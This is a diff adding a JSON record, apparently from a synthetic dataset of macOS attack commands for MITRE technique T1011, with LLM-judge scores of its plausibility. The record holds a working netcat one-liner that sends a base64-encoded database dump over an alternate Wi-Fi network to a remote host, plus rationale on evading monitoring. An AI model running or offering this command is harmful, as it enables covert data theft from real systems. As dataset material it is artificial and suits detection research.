@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"field_ops_149\" \"kHz149-pass\" && base64 < /Users/Shared/exports/db.dump | nc -6u fe80::7a8b:9c0d:1e2f:3a4b%en0 53317 -w 2",
+  "explanation": "Uses an alternate Wi‑Fi SSID to exfiltrate a database dump via IPv6 UDP to a high, uncommon port, reducing overlap with typical monitored services. This leverages a different network medium than the primary channel, consistent with T1011.",
+  "rationale_steps": [
+    "Drop any existing Wi‑Fi association.",
+    "Join a non-corporate SSID on a less common 5 GHz channel.",
+    "Base64-encode the dump to make payload less obvious in transit.",
+    "Transmit via IPv6 UDP on a high port scoped to the Wi‑Fi interface."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-0762cc79",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Commands are correctly chained with && and |, quoting is balanced, and the flags for airport, networksetup, and nc (including IPv6 link-local scope) are valid and parseable.",
+        "semantic_score": 4,
+        "semantic_justification": "It disconnects and joins a target Wi‑Fi SSID then base64-encodes and sends the file via IPv6 UDP to a link‑local address consistent with T1011, but missing sudo for networksetup and the incorrect 'Privilege: None' reduce operational plausibility.",
+        "combined_score": 4.5,
+        "confidence": 0.83,
+        "timestamp": "2025-10-01T01:09:09.941320Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with properly balanced quotes, valid use of &&, pipe, and redirection operators, and correct flag syntax for airport, networksetup, base64, and nc.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements T1011 by disassociating from the current Wi-Fi network, joining an alternate SSID, and exfiltrating a base64-encoded database dump over IPv6 UDP via netcat to an uncommon port, though the 'None' privilege claim is inaccurate since sudo is required for the airport -z disassociation step.",
+        "combined_score": 4.5,
+        "confidence": 0.85,
+        "timestamp": "2026-02-18T22:05:55.283605Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses standard macOS utilities with valid flags and correctly utilizes logical operators and pipes for sequential execution.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements the technique by disconnecting from the current network, joining a specific alternate SSID, and exfiltrating data via a different network path.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:05:57.572938Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
